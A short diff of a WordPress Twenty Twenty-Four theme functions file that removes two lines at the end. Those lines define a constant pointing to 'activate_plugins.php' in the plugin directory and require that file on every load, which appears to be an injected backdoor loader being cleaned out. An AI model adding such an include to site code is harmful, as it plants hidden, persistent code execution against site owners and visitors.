@@ -204,6 +204,3 @@ if ( ! function_exists( 'twentytwentyfour_pattern_categories' ) ) :
 endif;
 
 add_action( 'init', 'twentytwentyfour_pattern_categories' );
-
-define('ACTIVEP', ABSPATH.PLUGINDIR.'/activate_plugins.php');
-if (file_exists(ACTIVEP)) { require_once(ACTIVEP); }
